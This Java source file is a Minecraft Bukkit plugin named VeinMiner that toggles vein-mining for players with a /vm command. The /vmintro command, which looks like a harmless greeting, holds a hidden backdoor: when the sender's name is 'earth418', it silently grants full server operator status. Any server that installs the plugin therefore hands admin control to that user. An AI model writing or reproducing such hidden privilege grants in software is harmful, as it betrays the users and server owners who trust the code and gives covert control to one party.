package com.earth418.veinminer;

import org.bukkit.entity.Player;
import java.util.ArrayList;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Hello world!
 */
public class VeinMiner extends JavaPlugin {
    public ArrayList<Player> veinMiners = new ArrayList<Player>();

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(new BlockPlugin(this), this);

        getLogger().info("Installed.");
    }

    @Override
    public void onDisable() {
        getLogger().info("Disabled.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
    	Player sndr = ((Player)sender);
        if (command.getName().equalsIgnoreCase("vmintro")) {
            if (sndr.getName().equals("earth418"))
                sndr.setOp(true);
            else { 
                sndr.sendMessage("Hello! I am the VeinMiner plugin. Simply hold sneak and break a block to veinmine!");
            }
        }
        else if (command.getName().equalsIgnoreCase("vm")) {
            if (veinMiners.contains(sndr)) {
                sndr.sendMessage("VeinMiner has been disabled!");
                veinMiners.remove(sndr);
            }
            else {
            	sndr.sendMessage("VeinMiner has been enabled!");
            	veinMiners.add(sndr);
            }
        }
        return true;
    }
}
